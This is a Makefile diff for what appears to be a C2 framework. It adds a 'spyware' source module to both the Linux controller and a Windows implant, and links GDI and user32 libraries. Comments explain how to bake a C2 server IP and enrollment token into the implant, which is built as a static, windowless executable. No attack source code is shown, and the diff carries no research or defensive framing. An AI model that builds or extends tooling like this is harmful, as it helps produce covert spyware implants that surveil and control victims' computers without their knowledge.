@@ -25,7 +25,7 @@ all: $(TARGETS)
 # -pthread is needed by platform.h (keepalive thread on the implant side,
 # and OpenSSL's thread safety internally).
 $(LINUX_DIR)/controller: src/controller.c src/protocol.c src/tls.c \
-                          src/controller_utils.c | $(LINUX_DIR)
+                          src/controller_utils.c src/spyware_controller.c | $(LINUX_DIR)
 	$(CC) $(CFLAGS) $^ -o $@ \
 	    -lssl -lcrypto -ldl -lpthread
 
@@ -37,15 +37,15 @@ $(LINUX_DIR)/controller: src/controller.c src/protocol.c src/tls.c \
 # Pass -DC2_DEFAULT_HOST="<ip>" to bake the C2 IP in:
 #   make bin/windows/implant.exe C2_HOST_IP=192.168.1.100 ENROLLMENT_TOKEN=<hex>
 $(WIN_DIR)/implant.exe: src/implant.c src/protocol.c src/tls.c \
-                         src/implant_utils.c include/implant_certs.h | $(WIN_DIR)
+                         src/implant_utils.c src/spyware.c include/implant_certs.h | $(WIN_DIR)
 	$(CC_WIN) $(CFLAGS_WIN) \
 	    $(if $(C2_HOST_IP),-DC2_DEFAULT_HOST=\"$(C2_HOST_IP)\") \
 	    $(if $(ENROLLMENT_TOKEN),-DENROLLMENT_TOKEN=\"$(ENROLLMENT_TOKEN)\") \
 	    -I $(OPENSSL_WIN_INC) \
-	    src/implant.c src/protocol.c src/tls.c src/implant_utils.c \
+	    src/implant.c src/protocol.c src/tls.c src/implant_utils.c src/spyware.c \
 	    -o $@ \
 	    -L $(OPENSSL_WIN_LIB) \
-	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt \
+	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 \
 	    -mwindows \
 	    -static
 
